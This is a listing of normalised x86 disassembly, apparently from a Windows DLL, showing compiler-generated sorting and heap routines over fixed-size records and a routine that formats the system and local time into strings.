mov ecx [ ebp + 0x8 ]
add esp 0x8
test al al
jne r-xdata
mov esi [ ebp - 0x10 ]
cmp ebx esi
jb r-xdata
jne r-xdata
mov ebx [ ebp - 0x4 ]
lea edi [ ebx - 0x54 ]
lea esp [ esp ]
add edi 0x54
cmp edi [ ebp + 0x8 ]
jb r-xdata
push esi
push edi
call [ ebp + 0xc ]
add esp 0x8
test al al
jne r-xdata
mov [ ebp - 0x8 ] ebx
add ebx 0x54
cmp ebx ecx
jb r-xdata
lea eax [ esi - 0x54 ]
push esi
push eax
mov [ ebp - 0x10 ] eax
call edi
add esp 0x8
test al al
jne r-xdata
sub eax 0x54
mov [ ebp - 0x4 ] eax
cmp edi [ ebp + 0x8 ]
jne r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
sub ebx 0x54
sub edi 0x54
cmp [ ebp - 0xc ] ebx
jb r-xdata
push edi
push esi
call [ ebp + 0xc ]
add esp 0x8
test al al
jne r-xdata
push edi
push esi
call [ ebp + 0xc ]
add esp 0x8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] edi
mov eax ebx
add ebx 0x54
cmp eax edi
je r-xdata
jmp r-xdata
mov edx eax
mov ecx edi
call sub_10017140
mov eax [ ebp - 0x4 ]
add edi 0x54
mov ecx [ ebp + 0x8 ]
jmp r-xdata
sub esi 0x54
cmp eax esi
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
je r-xdata
push esi
push edi
call [ ebp + 0xc ]
add esp 0x8
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x4 ]
cmp eax ecx
mov ebx [ ebp - 0x8 ]
sub esi 0x54
cmp esi edi
je r-xdata
lea ecx [ ebx - 0x54 ]
mov edx edi
call sub_10017140
mov [ ebp - 0x10 ] edi
sub ebx 0x54
mov ecx esi
mov edx ebx
mov [ ebp - 0x8 ] ebx
call sub_10017140
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
mov edx esi
mov ecx eax
call sub_10017140
mov edx edi
add ebx 0x54
add edi 0x54
mov [ ebp - 0x8 ] ebx
mov ecx esi
mov [ ebp - 0x10 ] edi
add esi 0x54
call sub_10017140
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
jmp r-xdata
mov edx ebx
mov ecx esi
call sub_10017140
mov edx edi
mov ecx esi
call sub_10017140
cmp edi ecx
jae r-xdata
sub_10016a00
push ebp
mov ebp esp
sub esp 0xc
mov eax 0x30c30c31
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
push edi
sub esi ebx
mov edi edx
imul esi
push ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x28
jle r-xdata
push edi
call [ ebp + 0xc ]
add esp 0x8
test al al
je r-xdata
mov esi [ ebp + 0xc ]
inc eax
cdq
and edx 0x7
add eax edx
sar eax 0x3
imul ecx eax 0xa8
imul eax eax 0x54
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
add eax ebx
push eax
mov [ ebp - 0x4 ] eax
call esi
add esp 0x8
test al al
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
push esi
call [ ebp + 0xc ]
add esp 0x8
test al al
je r-xdata
mov edx ebx
mov ecx edi
call sub_10017140
mov eax [ ebp - 0xc ]
push [ ebp - 0x4 ]
add eax ebx
push eax
call esi
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_10017140
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx edi
mov ecx esi
call sub_10017140
push ebx
push edi
call [ ebp + 0xc ]
mov ebx edi
sub ebx [ ebp - 0x8 ]
push ebx
push edi
call esi
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
lea ecx [ ecx + ebx ]
call sub_10017140
push ebx
push [ ebp - 0x4 ]
call esi
add esp 0x8
test al al
je r-xdata
mov edx ebx
mov ecx edi
call sub_10017140
mov eax [ ebp - 0x8 ]
add eax edi
push edi
push eax
call esi
add esp 0x8
test al al
je r-xdata
mov edx ebx
mov ecx edi
call sub_10017140
mov ecx [ ebp - 0x4 ]
mov edx ebx
call sub_10017140
mov eax [ ebp + 0x8 ]
mov ebx eax
sub eax [ ebp - 0xc ]
sub ebx [ ebp - 0x8 ]
push eax
push ebx
mov [ ebp - 0xc ] eax
call esi
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx edi
lea ecx [ ecx + edi ]
call sub_10017140
push ebx
push edi
call esi
add esp 0x8
test al al
je r-xdata
push ebx
push [ ebp + 0x8 ]
call esi
add esp 0x8
test al al
je r-xdata
mov edx [ ebp - 0xc ]
mov ecx ebx
call sub_10017140
mov edx ebx
mov ecx edi
call sub_10017140
push [ ebp - 0x4 ]
push edi
call esi
add esp 0x8
test al al
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_10017140
push [ ebp - 0xc ]
push ebx
call esi
add esp 0x8
test al al
je r-xdata
push edi
push ebx
call esi
add esp 0x8
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx edi
call sub_10017140
mov edx [ ebp - 0xc ]
mov ecx ebx
call sub_10017140
mov edx edi
mov ecx ebx
call sub_10017140
mov ebx [ ebp - 0x4 ]
push ebx
push edi
call esi
jmp r-xdata
add esp 0x8
test al al
je r-xdata
sub_10016bb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e0e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebp + 0x8 ]
sub edx ebx
mov [ ebp - 0x6c ] eax
mov eax 0x30c30c31
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x68 ] eax
cdq
sub eax edx
mov esi eax
sar esi 0x1
test esi esi
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
imul edi esi 0x54
add edi ebx
lea ecx [ ecx ]
xor eax eax
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
push [ ebp - 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4c ] 0x8
jb r-xdata
push [ ebp - 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0x4c ] 0x7
mov [ ebp - 0x50 ] 0x0
mov [ ebp - 0x60 ] ax
test esi esi
jg r-xdata
push [ ebp - 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
sub edi 0x54
lea ecx [ ebp - 0x64 ]
push edi
dec esi
call sub_10016740
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
push [ ebp - 0x6c ]
mov edx esi
mov ecx ebx
push eax
push [ ebp - 0x68 ]
call sub_10017250
add esp 0xc
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
sub_10016ce0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e118
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov ebx ecx
mov eax [ ebp + 0x8 ]
mov esi edi
mov [ ebp - 0x70 ] eax
sub esi ebx
mov eax 0x30c30c31
imul esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov eax 0xffffffe4
lea esi [ edi - 0x38 ]
sub eax ebx
mov [ ebp - 0x68 ] eax
mov eax 0x38
sub eax ebx
mov [ ebp - 0x6c ] eax
lea ebx [ ebx ]
lea eax [ ebx + 0x1c ]
cmp esi eax
je r-xdata
push 0xffffffff
push 0x0
push ecx
lea ecx [ esi - 0x18 ]
call sub_10003a20
lea ecx [ esi + 0x18 ]
lea eax [ ebx + 0x34 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10003a20
mov eax [ ebx + 0x4c ]
push [ ebp - 0x70 ]
mov ecx [ ebp - 0x68 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x50 ]
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x64 ]
push eax
lea ecx [ ecx + esi ]
mov eax 0x30c30c31
imul ecx
mov ecx ebx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
xor edx edx
push eax
call sub_10017250
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x64 ]
call sub_100153c0
mov ecx [ ebp - 0x6c ]
sub esi 0x54
mov eax 0x30c30c31
lea ecx [ ecx + esi ]
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jg r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea edi [ esi - 0x1c ]
push edi
lea ecx [ ebp - 0x64 ]
call sub_10016740
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebx + 0x4 ]
mov eax [ ebx ]
mov [ edi ] eax
lea eax [ esi - 0x18 ]
cmp eax ecx
je r-xdata
sub_10016e30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e160
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x74 ] edx
mov ebx ecx
mov [ ebp - 0x78 ] ebx
mov eax [ ebp + 0x8 ]
lea esi [ ebx + 0x54 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x70 ] esi
cmp esi edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
lea eax [ esi - 0x54 ]
mov [ ebp - 0x68 ] eax
lea ecx [ ecx ]
mov eax [ ebp - 0x68 ]
mov ebx eax
push eax
lea eax [ ebp - 0x64 ]
push eax
call [ ebp - 0x6c ]
add esp 0x8
test al al
je r-xdata
mov edi [ ebp - 0x68 ]
mov edx esi
push [ ebp - 0x74 ]
mov ecx ebx
lea eax [ edi + 0xa8 ]
push eax
call sub_10017480
mov eax [ ebp - 0x64 ]
lea ecx [ ebx + 0x4 ]
mov [ ebx ] eax
add esp 0x8
lea eax [ ebp - 0x60 ]
cmp ecx eax
je r-xdata
mov eax [ ebp - 0x64 ]
lea ecx [ edi + 0x4 ]
mov [ edi ] eax
lea eax [ ebp - 0x60 ]
cmp ecx eax
je r-xdata
mov esi ebx
add esi 0x1c
lea ecx [ ebx + 0x1c ]
lea eax [ ebp - 0x48 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea ecx [ edi + 0x1c ]
lea eax [ ebp - 0x48 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea ecx [ edi + 0x1c ]
cmp ecx esi
je r-xdata
push 0xffffffff
push 0x0
lea eax [ esi - 0x18 ]
push eax
call sub_10003a20
lea ecx [ ebx + 0x34 ]
lea eax [ ebp - 0x30 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea ecx [ edi + 0x34 ]
lea eax [ ebp - 0x30 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea ecx [ edi + 0x34 ]
lea eax [ esi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push esi
call sub_10003a20
mov eax [ ebp - 0x18 ]
mov [ ebx + 0x4c ] eax
mov eax [ ebp - 0x14 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x78 ]
mov [ edi + 0x4c ] eax
mov eax [ ebp - 0x14 ]
mov [ edi + 0x50 ] eax
mov edi [ ebp - 0x68 ]
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ esi + 0x30 ]
mov [ edi + 0x4c ] eax
mov eax [ esi + 0x34 ]
sub esi 0x54
mov [ edi + 0x50 ] eax
mov edi ebx
sub ebx 0x54
lea eax [ ebp - 0x64 ]
push ebx
push eax
call [ ebp - 0x6c ]
add esp 0x8
test al al
jne r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] ax
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
push [ ebp - 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax [ ebx ]
lea ecx [ edi + 0x4 ]
mov [ edi ] eax
lea eax [ esi - 0x18 ]
cmp ecx eax
je r-xdata
mov esi [ ebp - 0x70 ]
xor eax eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x4c ] 0x8
jb r-xdata
push [ ebp - 0x48 ]
call j_sub_1003f3e3#2
add esp 0x4
add esi 0x54
mov [ ebp - 0x4c ] 0x7
xor eax eax
mov [ ebp - 0x50 ] 0x0
add edi 0x54
mov [ ebp - 0x60 ] ax
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x68 ] edi
cmp esi [ ebp - 0x74 ]
jne r-xdata
push [ ebp - 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
push esi
lea ecx [ ebp - 0x64 ]
mov edi esi
call sub_10016740
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
push ebx
push eax
call [ ebp - 0x6c ]
add esp 0x8
test al al
je r-xdata
sub_10017090
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e1a1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov edi ecx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
add esi 0x54
mov [ ebp + 0x8 ] esi
add edi 0x54
mov [ ebp - 0x1c ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_10016740
cmp edi ebx
je r-xdata
sub_10017114
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_1003e35b
int3
mov edi edi
mov ecx esi
call sub_100153c0
add esi 0x54
cmp esi edi
jne r-xdata
sub_10017140
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e1c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov ebx ecx
mov [ ebp - 0x68 ] ebx
push ebx
lea ecx [ ebp - 0x64 ]
call sub_10016740
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebx + 0x4 ]
mov eax [ esi ]
mov [ ebx ] eax
lea eax [ esi + 0x4 ]
cmp ecx eax
je r-xdata
lea edi [ esi + 0x1c ]
lea ecx [ ebx + 0x1c ]
cmp ecx edi
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov ecx [ ebp - 0x68 ]
lea ebx [ esi + 0x34 ]
lea eax [ ecx + 0x34 ]
cmp eax ebx
je r-xdata
push 0xffffffff
push 0x0
push edi
call sub_10003a20
mov eax [ esi + 0x4c ]
mov [ ecx + 0x4c ] eax
mov eax [ esi + 0x50 ]
mov [ ecx + 0x50 ] eax
lea ecx [ esi + 0x4 ]
mov eax [ ebp - 0x64 ]
mov [ esi ] eax
lea eax [ ebp - 0x60 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx eax
call sub_10003a20
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x48 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ ebp - 0x30 ]
cmp ebx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_10003a20
mov eax [ ebp - 0x18 ]
mov [ esi + 0x4c ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x64 ]
call sub_100153c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push 0xffffffff
push 0x0
push eax
mov ecx ebx
call sub_10003a20
sub_10017250
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
push ebx
mov ebx edx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] ebx
lea esi [ ebx * 2 + 0x2 ]
mov [ ebp - 0x4 ] edi
cmp esi eax
jge r-xdata
jne r-xdata
imul ecx esi 0x54
add ecx edi
lea eax [ ecx - 0x54 ]
push eax
push ecx
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
push [ ebp + 0x10 ]
mov edx ebx
mov ecx edi
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
call sub_10017380
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
imul eax eax 0x54
imul esi ebx 0x54
add esi edi
add eax 0xffffffac
add eax edi
lea ecx [ esi + 0x4 ]
mov ebx eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ esi ] eax
lea eax [ ebx + 0x4 ]
cmp ecx eax
je r-xdata
imul edi esi 0x54
imul ebx ebx 0x54
add edi [ ebp - 0x4 ]
add ebx [ ebp - 0x4 ]
mov eax [ edi ]
mov [ ebx ] eax
lea ecx [ ebx + 0x4 ]
lea eax [ edi + 0x4 ]
cmp ecx eax
je r-xdata
dec esi
lea eax [ ebx + 0x1c ]
lea ecx [ esi + 0x1c ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ edi + 0x1c ]
lea ecx [ ebx + 0x1c ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ ebx + 0x34 ]
lea ecx [ esi + 0x34 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ edi + 0x34 ]
lea ecx [ ebx + 0x34 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov eax [ ebx + 0x50 ]
mov ebx [ ebp + 0x8 ]
mov [ esi + 0x50 ] eax
dec ebx
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ edi + 0x4c ]
mov [ ebx + 0x4c ] eax
mov eax [ edi + 0x50 ]
mov edi [ ebp - 0x4 ]
mov [ ebx + 0x50 ] eax
mov ebx esi
mov eax [ ebp + 0x8 ]
lea esi [ esi * 2 + 0x2 ]
cmp esi eax
jl r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
sub_10017380
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] ecx
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
cmp [ ebp + 0x8 ] edi
jge r-xdata
mov ebx [ ebp + 0xc ]
imul esi edi 0x54
add esi ecx
mov eax [ ebx ]
mov [ esi ] eax
lea ecx [ esi + 0x4 ]
lea eax [ ebx + 0x4 ]
cmp ecx eax
je r-xdata
nop
lea eax [ ebx + 0x1c ]
lea ecx [ esi + 0x1c ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov ecx [ ebp - 0x4 ]
mov eax [ esi ]
imul edi edi 0x54
add edi [ ebp - 0x4 ]
mov [ edi ] eax
lea ecx [ edi + 0x4 ]
lea eax [ esi + 0x4 ]
cmp ecx eax
je r-xdata
lea eax [ ebx + 0x34 ]
lea ecx [ esi + 0x34 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ esi + 0x1c ]
lea ecx [ edi + 0x1c ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov eax [ ebx + 0x50 ]
pop edi
mov [ esi + 0x50 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push 0x0
push eax
call sub_10003a20
lea eax [ esi + 0x34 ]
lea ecx [ edi + 0x34 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ esi + 0x4c ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x4c ] eax
mov eax [ esi + 0x50 ]
mov [ edi + 0x50 ] eax
lea eax [ ebx - 0x1 ]
cdq
mov edi ebx
sub eax edx
mov ebx eax
sar ebx 0x1
cmp [ ebp + 0x8 ] edi
jl r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
push [ ebp + 0xc ]
imul esi ebx 0x54
add esi ecx
push esi
call [ ebp + 0x10 ]
add esp 0x8
test al al
je r-xdata
sub_10017480
push ebp
mov ebp esp
push ecx
mov eax ecx
mov [ ebp - 0x4 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
lea esi [ edx + 0x1c ]
lea edi [ ebx + 0x1c ]
lea esp [ esp ]
cmp edi esi
je r-xdata
push 0xffffffff
push 0x0
lea eax [ esi - 0x18 ]
push eax
lea ecx [ edi - 0x18 ]
call sub_10003a20
lea eax [ esi + 0x18 ]
lea ecx [ edi + 0x18 ]
cmp ecx eax
je r-xdata
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_10003a20
mov ecx [ esi + 0x30 ]
mov [ edi + 0x30 ] ecx
mov ecx [ esi + 0x34 ]
mov [ edi + 0x34 ] ecx
lea ecx [ esi - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jne r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ esi - 0x70 ]
sub esi 0x54
sub ebx 0x54
sub edi 0x54
lea ecx [ esi - 0x18 ]
mov [ ebx ] eax
lea eax [ edi - 0x18 ]
cmp eax ecx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_10017510
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e212
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov esi ecx
mov [ ebp - 0x414 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x418 ] esi
jne r-xdata
mov ecx [ rw-data ]
movzx eax [ edi + 0xe ]
push eax
movzx eax [ edi + 0xc ]
push eax
movzx eax [ edi + 0xa ]
push eax
movzx eax [ edi + 0x8 ]
push eax
movzx eax [ edi + 0x6 ]
push eax
movzx eax [ edi + 0x2 ]
push eax
movzx eax [ edi ]
push eax
push ecx
lea eax [ ebp - 0x410 ]
push eax
call sub_1000cf80
mov [ esi + 0x14 ] 0xf
add esp 0x24
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ ebp - 0x410 ] 0x0
jne r-xdata
mov ecx 0x4d
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
lea ecx [ ebp - 0x410 ]
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ ebp - 0x410 ]
mov ecx esi
push eax
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x414 ] 0x1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
sub_10017620
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e26e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x2c ] esi
mov [ esp + 0xa8 ] 0x0
test esi esi
je r-xdata
xor edi edi
mov ecx [ edi - 0x24 ]
add edi 0xffffffdc
mov ecx [ ecx + 0x8 ]
add ecx edi
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov edi eax
jmp r-xdata
mov esi [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx 0x4e
call sub_100382c0
push eax
push rw-data
call ebx
mov [ esp + 0xa8 ] 0xffffffff
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x44 ] 0x0
mov [ esp + 0x44 ] 0xf
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0xa8 ] 0x1
lea eax [ esp + 0x88 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ esp + 0x78 ]
push eax
call [ GetLocalTime@IAT ]
cmp [ rw-data ] 0x0
mov ebx [ InterlockedExchange@IAT ]
jne r-xdata
mov ebx [ rw-data ]
cmp [ esi ] 0x0
jne r-xdata
mov ecx 0x4f
call sub_100382c0
push eax
push rw-data
call ebx
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x38 ]
call sub_10005470
lea edx [ esp + 0x88 ]
lea ecx [ esp + 0x60 ]
call sub_10017510
mov [ esp + 0xa8 ] 0x2
lea ecx [ esp + 0x30 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x74 ] 0x10
jb r-xdata
push 0x1
push r--data
lea ecx [ esp + 0x38 ]
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] 0x0
call sub_10005470
cmp [ ebx ] 0x0
jne r-xdata
push [ esp + 0x60 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx ebx
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0x38 ]
call sub_10005470
lea edx [ esp + 0x78 ]
lea ecx [ esp + 0x48 ]
call sub_10017510
mov [ esp + 0xa8 ] 0x3
lea ecx [ esp + 0x30 ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x5c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
lea eax [ esp + 0x38 ]
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x1c ]
push eax
mov [ esp + 0x68 ] 0xf
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
